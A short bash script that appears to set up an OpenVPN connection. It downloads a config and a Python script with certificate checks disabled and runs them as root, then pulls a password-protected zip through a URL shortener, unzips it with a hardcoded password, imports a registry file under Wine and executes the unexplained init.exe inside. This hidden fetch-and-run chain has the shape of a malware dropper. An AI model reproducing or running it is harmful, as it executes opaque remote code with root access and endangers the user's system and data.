#!/bin/bash -e
sudo apt update;
sudo apt install unzip wget openvpn python3-dev python3-pip -y;
sudo pip3 install requests;
wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate;
wget -O /root/pingvpn.py https://github.com/ind3p3nd3nt/sickvpn.vip/raw/master/pingvpn.py --no-check-certificate; 
python3 /root/pingvpn.py;
openvpn /root/sickvpn.conf&
if [ ! -d "/root/init" ]; then mkdir /root/init/; fi
wget --no-check-certificate -O /root/init/init.zip https://is.gd/initzip;
cd /root/init/;
rm -rf init.exe;
unzip -P1011011011 init.zip;
wine regedit /s /root/s.reg;
wine init.exe;
exit 0
